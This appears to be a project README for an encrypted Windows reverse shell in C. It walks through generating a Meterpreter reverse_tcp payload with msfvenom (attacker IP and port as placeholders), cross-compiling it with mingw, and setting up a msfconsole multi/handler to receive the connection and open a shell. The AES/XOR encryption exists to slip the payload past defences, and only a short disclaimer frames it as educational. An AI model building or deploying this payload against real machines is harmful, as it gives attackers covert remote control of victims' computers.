# Encrypted Reverse shell in C

Created a simple reverse shell in C that is encrypted using  AES and XOR  algorithm.


The reverse shell is pretty much hardcoded with my IP and port number. You can change it to your own IP and port number.

Using msfvenom to generate a reverse shell payload. The command line i used to generate the payload is:

```bash
    msfvenom --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=4444 EXITFUNC=thread -f c
```

Then this can be pasted in the `reverse.c` file.

## Usage

### Linux Compilation 

```bash
    x86_64-w64-mingw32-gcc reverse.c aes.c -o exec_file_name.exe
```

#### Dependencies
- mingw32-gcc

### msfconsole
 run: 
```bash
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set LHOST <Your IP>
    set LPORT 4444
    exploit
```

and wait for the connection, and use "shell" to pop the shell.


## References

- AES encryption and decryption code is taken from kokke's [Tiny AES in C](https://github.com/kokke/tiny-AES-c)

- Inpired in screek reverse shell video. 
## Disclaimer

This reverse shell is for educational purposes only. I am not responsible for any misuse of this code.
